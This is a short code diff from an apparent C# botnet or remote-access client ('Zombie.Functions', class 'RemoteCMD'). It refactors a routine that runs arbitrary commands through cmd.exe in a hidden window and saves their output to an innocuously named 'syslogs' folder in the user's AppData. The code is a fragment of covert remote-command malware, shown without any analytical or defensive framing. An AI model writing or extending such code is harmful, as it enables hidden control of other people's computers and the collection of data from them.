@@ -16,7 +16,7 @@ namespace Zombie.Functions
     static class RemoteCMD
     {
         static RemoteCMD()
-        {        
+        {
             _outputDir = $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\syslogs\\";
         }
 
@@ -101,14 +101,16 @@ namespace Zombie.Functions
 
         private static Process CreateCMDProcess(string command)
         {
-            Process pProcess = new Process();
-            pProcess.StartInfo = new ProcessStartInfo()
+            Process pProcess = new Process
             {
-                FileName = "cmd.exe",
-                Arguments = $"/c {command} > \"{_outputFile}\" 2>&1",
-                UseShellExecute = false,
-                WorkingDirectory = WorkingDirectory,
-                CreateNoWindow = true
+                StartInfo = new ProcessStartInfo()
+                {
+                    FileName = "cmd.exe",
+                    Arguments = $"/c {command} > \"{_outputFile}\" 2>&1",
+                    UseShellExecute = false,
+                    WorkingDirectory = WorkingDirectory,
+                    CreateNoWindow = true
+                }
             };
             return pProcess;
         }
